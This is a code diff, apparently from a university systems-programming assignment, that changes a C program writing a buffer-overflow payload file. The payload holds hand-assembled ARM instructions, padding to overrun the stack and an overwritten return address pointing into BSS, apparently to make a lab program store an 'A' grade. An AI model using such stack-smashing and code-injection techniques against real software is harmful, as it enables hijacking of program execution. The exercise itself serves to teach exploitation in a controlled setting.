@@ -28,13 +28,13 @@ int main(void) {
    dataA = fopen("dataA", "w+");
 
    /* write names to file */ 
-   fprintf(dataA, "Alex Delistathis/Matt Zhang");
+   fprintf(dataA, "Alex & Matt"); /* 11 characters */ 
 
    /* write null byte to file */
    putc('\0', dataA);
 
    /* Calculate the address where the payload will be loaded */
-   payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420074);
+   payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);
    fwrite(&payloadAddress, sizeof(unsigned int), 1, dataA);
 
    /* Move 'A' into a register */
@@ -46,11 +46,21 @@ int main(void) {
    fwrite(&strbInstr, sizeof(unsigned int), 1, dataA);
 
    /* Branch back to main function after getName */
-   bInstr = MiniAssembler_b(0x420080, 0x40087c);
+   bInstr = MiniAssembler_b(0x40089c, 0x420070);
    fwrite(&bInstr, sizeof(unsigned int), 1, dataA);
 
    /* add padding to overrun the stack */
-   fprintf(dataA, "%s", "anggg");
+   fprintf(dataA, "%s", "anganganganganganggg"); /* 20 characters */
+
+   /* write BSS address of adr instruction to file */
+   fprintf(dataA, "%c", 0x64);
+   fprintf(dataA, "%c", 0x00);
+   fprintf(dataA, "%c", 0x42);
+   fprintf(dataA, "%c", 0x00);
+   fprintf(dataA, "%c", 0x00);
+   fprintf(dataA, "%c", 0x00);
+   fprintf(dataA, "%c", 0x00);
+   fprintf(dataA, "%c", 0x00);
    
    /* close the file */
    fclose(dataA);
